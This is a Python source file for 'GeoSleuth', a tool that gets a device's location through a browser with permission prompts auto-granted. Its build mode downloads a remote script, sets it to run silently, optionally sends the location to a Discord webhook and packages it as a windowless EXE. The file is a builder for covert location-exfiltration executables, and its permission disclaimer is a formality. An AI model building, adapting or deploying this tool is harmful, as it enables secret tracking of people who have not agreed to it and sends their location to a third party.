from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager
import time
import sys
import platform
import os
import tempfile
import requests
import subprocess

# Basic Colors
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'

# Bright Colors
BRIGHT_BLACK = '\033[90m'
BRIGHT_RED = '\033[91m'
BRIGHT_GREEN = '\033[92m'
BRIGHT_YELLOW = '\033[93m'
BRIGHT_BLUE = '\033[94m'
BRIGHT_MAGENTA = '\033[95m'
BRIGHT_CYAN = '\033[96m'
BRIGHT_WHITE = '\033[97m'

# Background Colors
BACKGROUND_BLACK = '\033[40m'
BACKGROUND_RED = '\033[41m'
BACKGROUND_GREEN = '\033[42m'
BACKGROUND_YELLOW = '\033[43m'
BACKGROUND_BLUE = '\033[44m'
BACKGROUND_MAGENTA = '\033[45m'
BACKGROUND_CYAN = '\033[46m'
BACKGROUND_WHITE = '\033[47m'

# Bright Background Colors
BACKGROUND_BRIGHT_BLACK = '\033[100m'
BACKGROUND_BRIGHT_RED = '\033[101m'
BACKGROUND_BRIGHT_GREEN = '\033[102m'
BACKGROUND_BRIGHT_YELLOW = '\033[103m'
BACKGROUND_BRIGHT_BLUE = '\033[104m'
BACKGROUND_BRIGHT_MAGENTA = '\033[105m'
BACKGROUND_BRIGHT_CYAN = '\033[106m'
BACKGROUND_BRIGHT_WHITE = '\033[107m'

# Text Attributes
BOLD = '\033[1m'
DIM = '\033[2m'
ITALIC = '\033[3m'
UNDERLINE = '\033[4m'
BLINK = '\033[5m'
REVERSE = '\033[7m'
HIDDEN = '\033[8m'

# Reset (to default terminal color)
RESET = '\033[0m'

help_t ='''

GeoSleuth - Location Extraction & EXE Builder  
Developed by Synthiny  
---------------------------------------------------
GeoSleuth is a Python script that allows you to extract the location of a device using Google services. You can also create a custom executable with various configuration options, including sending the location to a webhook.  

Usage:  
  python geosleuth.py [options]  

Options:  
  -run            Starts the geolocation script
  -address        Returns the address instead of longitude/latitude.  
  -debug          Enables debug mode to show detailed logs.  
  -nowindow       Runs silently in the background with no visible window.  
  -accuracy       Displays the location's accuracy (in meters as a radius).
  -rmtracker      Removes tracker files   
  -build          Builds a custom EXE or Python file with your specified settings.  

Build Mode:  
  After running the `-build` command, GeoSleuth will prompt you to configure the following:  
    1. \033[1mNoWindow\033[0m: Specify if the build should run without displaying a window.  
    2. \033[1mDebug\033[0m: Enable or disable debug mode for troubleshooting.  
    3. \033[1mAddress\033[0m: Decide whether to include address information in the output.  
    4. \033[1mAccuracy\033[0m: Return the accuracy of the geolocation (in meters as a radius).
    5. \033[1mSystem Check\033[0m: Include tracker files prevent the script from ever running again (not recommended).  


Examples:  
  python geosleuth.py -run -address -accuracy -debug
    → Returns the address with the accuracy radius in meters.  

  python geosleuth.py -build  
    → Enters build mode to create a custom single EXE or python script.  

  python geosleuth.py -run -nowindow -debug
    → Runs the script completely silently in the background.  

---------------------------------------------------  
⚠️  \033[1mDisclaimer:\033[0m Use this tool responsibly and ensure you have permission to gather location data. The author is not responsible for any misuse of this software.  


'''
def print_error(message):
    error_code = '\033[91m'
    reset_code = '\033[0m'
    
    top_border = "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"
    bottom_border = "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
    side_border = "┃"
    
    border_length = len(top_border) - 2
    message_length = len(message)
    padding_length = border_length - message_length
    left_padding = padding_length // 2
    right_padding = padding_length - left_padding

    print(f"{error_code}{top_border}{reset_code}")
    print(f"{error_code}{side_border}{' ' * left_padding}{message}{' ' * right_padding}{side_border}{reset_code}")
    print(f"{error_code}{bottom_border}{reset_code}")

def clr():
    os.system('cls' if platform.system() == 'Windows' else 'clear')

def helpInfo():
    print(help_t)

def remove_tracker():
    appdata_roaming = os.getenv('APPDATA')
    appdata_path = os.getenv('APPDATA')
    local_path = os.path.join(os.getenv('LOCALAPPDATA'), 'wpa', 'dpf', 'fname')
    roaming_microsoft_path = os.path.join(appdata_roaming, 'Roaming', 'Microsoft', 'services')
    chrome_data_path = os.path.join(local_path, 'Google', 'Chrome', 'User Data')
    chrome_cache_path = os.path.join(local_path, 'Google', 'Chrome', 'User Data', 'Default', 'Cache')
    chrome_extension_path = os.path.join(local_path, 'Google', 'Chrome', 'User Data', 'Default', 'Extensions')
    microsoft_edge_path = os.path.join(local_path, 'Microsoft', 'Edge', 'User Data')
    microsoft_edge_cache_path = os.path.join(local_path, 'Microsoft', 'Edge', 'User Data', 'Default', 'Cache')
    microsoft_services_path = os.path.join(appdata_path, 'Roaming', 'Microsoft', 'services')
    wpa_data_path = os.path.join(local_path, 'wpa', 'dpf', 'fname')
    user_documents_path = os.path.join(os.getenv('USERPROFILE'), 'Documents')
    user_downloads_path = os.path.join(os.getenv('USERPROFILE'), 'Downloads')
    microsoft_app_data_path = os.path.join(appdata_path, 'Roaming', 'Microsoft', 'AppData', 'services', 'chrome_service')
    temp_data_path = os.path.join(local_path, 'Temp', 'user_temp_folder')
    custom_log_path = os.path.join(local_path, 'mloc', 'logs', 'logfile')

    url = 'https://raw.githubusercontent.com/Synthiny/GeoSleuth/refs/heads/main/html/fname.html'
    response = requests.get(url)
    
    if response.status_code != 200:
        print(f"Failed to retrieve file names. HTTP Status: {response.status_code}")
        return

    file_names = response.text.strip().splitlines()
    directories = [appdata_path,
                local_path,
                roaming_microsoft_path,
                chrome_data_path,
                chrome_cache_path,
                chrome_extension_path,
                microsoft_edge_path,
                microsoft_edge_cache_path,
                microsoft_services_path,
                wpa_data_path,
                user_documents_path,
                user_downloads_path,
                microsoft_app_data_path,
                temp_data_path,
                custom_log_path
            ]
    total_removed = 0
    start_time = time.time()
    
    for dir_path in directories:
        if not os.path.exists(dir_path):
            continue
        
        for file_name in file_names:
            file_path = os.path.join(dir_path, file_name)

            if os.path.isfile(file_path):
                try:
                    os.remove(file_path)
                    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time()))
                    print(GREEN, f"[{current_time}] - Successfully removed {file_name} from {dir_path}", RESET)
                    total_removed += 1
                except Exception as e:
                    print(RED, f"Error removing file: {file_path}. Error: {e}", RESET)
            else:
                current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time()))
                print(YELLOW, f"[{current_time}] - No file named {file_name} found in {dir_path}", RESET)

    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time()))
    end_time = time.time()
    elapsed_time = end_time - start_time
    print(BOLD, f"[{current_time}] - Total removed: {total_removed}/12", RESET)
    print(BOLD,f"[{current_time}] - Total time: {elapsed_time}", RESET)
    print(BOLD,f"[{current_time}] - Tracker removal process completed.", RESET)

def tag():
    def rgb_interpolate(start_rgb, end_rgb, t):
        return tuple(int(start + (end - start) * t) for start, end in zip(start_rgb, end_rgb))

    def apply_gradient(text, start_rgb, end_rgb):
        gradient_text = ""
        for i, char in enumerate(text):
            t = i / (len(text) - 1)
            rgb = rgb_interpolate(start_rgb, end_rgb, t)
            gradient_text += f"\033[38;2;{rgb[0]};{rgb[1]};{rgb[2]}m{char}"
        return gradient_text

    start_rgb = (255, 100, 255)
    end_rgb = (255, 100, 100)

    ascii_art = r"""
   ▄██████▄     ▄████████  ▄██████▄     ▄████████  ▄█        ▄████████ ███    █▄      ███        ▄█    █▄    
  ███    ███   ███    ███ ███    ███   ███    ███ ███       ███    ███ ███    ███ ▀█████████▄   ███    ███   
  ███    █▀    ███    █▀  ███    ███   ███    █▀  ███       ███    █▀  ███    ███    ▀███▀▀██   ███    ███   
 ▄███         ▄███▄▄▄     ███    ███   ███        ███      ▄███▄▄▄     ███    ███     ███   ▀  ▄███▄▄▄▄███▄▄ 
▀▀███ ████▄  ▀▀███▀▀▀     ███    ███ ▀███████████ ███     ▀▀███▀▀▀     ███    ███     ███     ▀▀███▀▀▀▀███▀  
  ███    ███   ███    █▄  ███    ███          ███ ███       ███    █▄  ███    ███     ███       ███    ███   
  ███    ███   ███    ███ ███    ███    ▄█    ███ ███▌    ▄ ███    ███ ███    ███     ███       ███    ███   
  ████████▀    ██████████  ▀██████▀   ▄████████▀  █████▄▄██ ██████████ ████████▀     ▄████▀     ███    █▀    
                                                  ▀                                                            
"""
    for line in ascii_art.splitlines():
        print(apply_gradient(line, start_rgb, end_rgb))
    print('\033[0m')

def is_valid_discord_webhook(build_webhook: str) -> bool:
    try:
        response = requests.get(build_webhook)
        if response.status_code == 200:
            return True
        else:
            data = response.json()
            if "message" in data and data["message"] == "Invalid Webhook Token":
                print_error("Fail: Invalid Webhook Token.")
            else:
                print_error(f"Fail: Unexpected response - {data}")
    except requests.RequestException as e:
        print_error(f"Fail: An error occurred - {e}")

def build_inputs(prompt):
    while True:
        print(RESET, f'{prompt} y/n:', BOLD, end='')
        user_input = input().lower()
        if user_input in ['y', 'n']:
            return user_input
        else:
            print(RED, "Invalid input. Please enter 'y' or 'n'.", RESET)

def debug(message):
    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(time.time()))
    print(WHITE, f"[{current_time}] {message}", RESET)
    time.sleep(.05) #cmon it looks cleaner :3

def build():
    clr()
    tag()
    BUILD_NOWINDOW = build_inputs('Build with NoWindow?')
    BUILD_DEBUG = build_inputs('Build with Debug?')
    BUILD_ADDRESS = build_inputs('Build with Address?')
    BUILD_ACCURACY = build_inputs('Build with Accuracy?')
    BUILD_EXE = build_inputs('Build into exe? (not onfuscated)')
    BUILD_SYSTEMCHECK = build_inputs('Build with Tracker Files? (not recommended)')
    BUILD_WEBHOOK = build_inputs('Relay info to webhook? (only discord)')
    if BUILD_WEBHOOK == 'y':
        print(RESET, 'Enter the webhook URL (only Discord supported): ', BOLD, end='')
        BUILD_WEBHOOK = input()
        print(RESET)
        valid = (is_valid_discord_webhook(BUILD_WEBHOOK))

        if not valid:
            print(RESET)
            print_error("The webhook provided isn't valid")
            print(RESET, "Press enter to close... ", end='')
            input()
            clr()
            os._exit(0)
    else:
        BUILD_WEBHOOK = False

    clr()
    tag()
    print("Building\n__________________________________________________________________________")
    url = "https://raw.githubusercontent.com/Synthiny/GeoSleuth/refs/heads/main/DLIUB.py"
    
    response = requests.get(url)
    if response.status_code != 200:
        print("Failed to download the file.")
        return
    
    temp_dir = tempfile.gettempdir()
    with tempfile.NamedTemporaryFile(delete=False, mode='w', newline='', dir=temp_dir) as temp_file:
        temp_file.write(response.text)
        build_file_path = temp_file.name

    with open(build_file_path, 'r') as file:
        lines = file.readlines()

    BUILD_DEBUG = BUILD_DEBUG == 'y'
    BUILD_NOWINDOW = BUILD_NOWINDOW == 'y'
    BUILD_ADDRESS = BUILD_ADDRESS == 'y'
    BUILD_ACCURACY = BUILD_ACCURACY == 'y'
    BUILD_SYSTEMCHECK = BUILD_SYSTEMCHECK == 'y'
    BUILD_EXE = BUILD_EXE == 'y'

    modified_lines = []
    if BUILD_WEBHOOK != False:
        build_vars = {
            'DEBUG': BUILD_DEBUG,
            'NOWINDOW': BUILD_NOWINDOW,
            'ADDRESS': BUILD_ADDRESS,
            'ACCURACY': BUILD_ACCURACY,
            'WEBHOOK': f"r'{BUILD_WEBHOOK}'",
            'SYSTEMCHECK': BUILD_SYSTEMCHECK
        }
    else:
        build_vars = {
            'DEBUG': BUILD_DEBUG,
            'NOWINDOW': BUILD_NOWINDOW,
            'ADDRESS': BUILD_ADDRESS,
            'ACCURACY': BUILD_ACCURACY,
            'WEBHOOK': "False",
            'SYSTEMCHECK': BUILD_SYSTEMCHECK
        }


    debug(fr'USER_CONFIG: {build_vars}')
    for line in lines:
        for var, build_var in build_vars.items():
            if f"SELF_{var}" in line:
                modified_line = line.replace(f"SELF_{var} = None", f"SELF_{var} = {build_var}")
                modified_lines.append(modified_line)
                break
        else:
            modified_lines.append(line)
    
    current_dir = os.path.dirname(os.path.abspath(__file__))
    debug(f'Writing to {current_dir}')
    
    build_dir = os.path.join(current_dir, 'build')
    debug(fr"Created build folder - {build_dir}")

    os.makedirs(build_dir, exist_ok=True)
    debug('Checking...')
    build_file_path = os.path.join(build_dir, 'final.py')

    debug(fr'Copying settings... - {build_file_path}')
    with open(build_file_path, 'w') as file:
        file.writelines(modified_lines)
    os.chdir(build_dir)
    command = ['pyinstaller', '--onefile', f'final.py', f'--distpath={build_dir}', '--icon=NONE']
    if BUILD_EXE == True:
        if BUILD_NOWINDOW == True:
            command.append('--noconsole')
        else:
            command.append(f'--icon=NONE')
        debug(fr'Running command - {command}')
        start_time = time.time()
        subprocess.run(command)
        build_file_path = os.path.join(build_dir, 'final.exe')
    end_time = time.time()
    elapsed_time = end_time - start_time
    debug(f'Finished freezing in {elapsed_time} seconds')
    print(GREEN, "Build finished", RESET)
    print(BOLD, fr"""          └─── {build_file_path}""", RESET)
    os._exit(0)

def main():
    args = sys.argv[1:]
    expected_args = ["-nowindow", "-noconsole", "-debug", "-address", "-accuracy", "-help", "-build"]
    
    if args:
        for arg in expected_args:
            if arg in args:
                if '-help' in args:
                    clr()
                    tag()
                    helpInfo()
                    sys.exit()

            if "-build" in args or '--build' in args:
                build()

            SELF_DEBUG = False
            SELF_NOWINDOW = False
            SELF_ADDRESS = False
            SELF_ACCURACY = False
            SELF_DELAY = 1

            def reverse_geocode(latitude, longitude):
                try:
                    url = f"https://nominatim.openstreetmap.org/reverse?lat={latitude}&lon={longitude}&format=json&addressdetails=1"
                    response = requests.get(url, headers={'User-Agent': 'geo-reverse-geocoding'})
                    if response.status_code == 200:
                        if SELF_DEBUG == True:debug(f'Got response from url (200) - {url}')
                        data = response.json()
                        if "address" in data:
                            address = data["address"]
                            full_address = data.get("display_name", "")
                            return full_address.strip(", ")
                    return None
                except requests.exceptions.RequestException as e:
                    if SELF_DEBUG == True:debug(f"Error during geocoding: {e}")
                    return None
                
            def check_chromedriver():
                if not os.path.exists("chromedriver"):
                    if SELF_DEBUG == True:debug("Chromedriver not found. Downloading the latest version.")
                    driver_path = ChromeDriverManager().install()
                    return driver_path
                else:
                    if SELF_DEBUG == True:debug("Chromedriver found.")
                    return "chromedriver"
            if '-rmtracker'in args:
                remove_tracker()
                os._exit(0)

            if '-run' in args or '--run' in args:
                if '-nowindow' in args or '--nowindow' in args:
                    SELF_NOWINDOW = True
                if '-debug' in args or '--debug' in args:
                    SELF_DEBUG = True
                if '-address' in args or '--address' in args:
                    SELF_ADDRESS = True
                if '-accuracy' in args or '--accuracy' in args:
                    SELF_ACCURACY = True

                chrome_options = Options()
                if SELF_NOWINDOW == True:
                    chrome_options.add_argument("--headless")
                    if SELF_DEBUG == True:debug('Running with headless') 
                chrome_options.add_argument("--use-fake-ui-for-media-stream")
                chrome_options.set_capability('goog:loggingPrefs', {'browser': 'ALL'})

                chromedriver_path = check_chromedriver()
                service = Service(chromedriver_path)
                driver = webdriver.Chrome(service=service, options=chrome_options)
                if SELF_DEBUG == True:debug(f'Proceeding to url - https://synthiny.github.io/GeoSleuth/html/scrape.html')
                driver.get("https://synthiny.github.io/GeoSleuth/html/scrape.html")
                
                if SELF_DEBUG == True:debug(f'Waiting to load...')
                time.sleep(SELF_DELAY)

                CLIENT_LATITUDE = None
                CLIENT_LONGITUDE = None
                CLIENT_ACCURACY = None
                if SELF_DEBUG == True:debug(f'Retrieving console logs...')
                logs = driver.get_log('browser')

                for entry in logs:
                    if 'Latitude:' in entry['message']:
                        CLIENT_LATITUDE = float(entry['message'].split("Latitude: ")[1].split()[0].strip('"'))
                    elif 'Longitude:' in entry['message']:
                        CLIENT_LONGITUDE = float(entry['message'].split("Longitude: ")[1].split()[0].strip('"'))
                    elif 'Accuracy:' in entry['message']:
                        CLIENT_ACCURACY = float(entry['message'].split("Accuracy: ")[1].split()[0].strip('"'))
                
                if SELF_ADDRESS == True:
                    if SELF_DEBUG == True:debug(f'Reverse geocoding...')
                    CLIENT_ADDRESS = reverse_geocode(longitude=CLIENT_LONGITUDE, latitude=CLIENT_LATITUDE)

                if SELF_DEBUG == True:
                    debug(f"CLIENT_LATITUDE: {CLIENT_LATITUDE}")
                    debug(f"CLIENT_LONGITUDE: {CLIENT_LONGITUDE}")
                    if SELF_ACCURACY == True:debug(f"CLIENT_ACCURACY: {CLIENT_ACCURACY}")
                    if SELF_ADDRESS == True:debug(f"CLIENT_ADDRESS: {CLIENT_ADDRESS}")
                    driver.quit()
                    os._exit(0)
                else:
                    pass
                driver.quit()
                os._exit(0)
            else:
                pass
    else:
        clr()
        tag()
        helpInfo()
        sys.exit()

if __name__ in "__main__":
    main()
